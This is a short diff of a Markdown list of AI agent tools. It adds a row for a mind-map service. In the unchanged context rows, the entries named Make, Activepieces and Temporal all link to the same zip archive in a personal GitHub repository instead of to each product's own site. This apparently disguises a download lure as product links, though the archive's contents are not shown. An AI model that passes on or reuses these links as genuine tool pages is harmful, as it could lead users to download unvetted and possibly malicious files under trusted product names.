@@ -274,6 +274,8 @@
 | [Make](https://raw.githubusercontent.com/G1o22/awesome-ai-agents-2026/main/assets/ai-agents-awesome-3.7.zip) | Visual workflow platform. AI capabilities. | Free / Paid |
 | [Activepieces](https://raw.githubusercontent.com/G1o22/awesome-ai-agents-2026/main/assets/ai-agents-awesome-3.7.zip) | OSS Zapier alternative with AI. | Free (OSS) |
 | [Temporal](https://raw.githubusercontent.com/G1o22/awesome-ai-agents-2026/main/assets/ai-agents-awesome-3.7.zip) | Durable execution for long-running agent workflows. | Free / Cloud |
+| [MindMap AI](https://mindmapai.app/text-summarizer) | AI-powered tool to convert text, PDFs, research, and notes into structured mind maps for better understanding and planning. | Free |
+
 
 ### No-Code Agent Builders
 
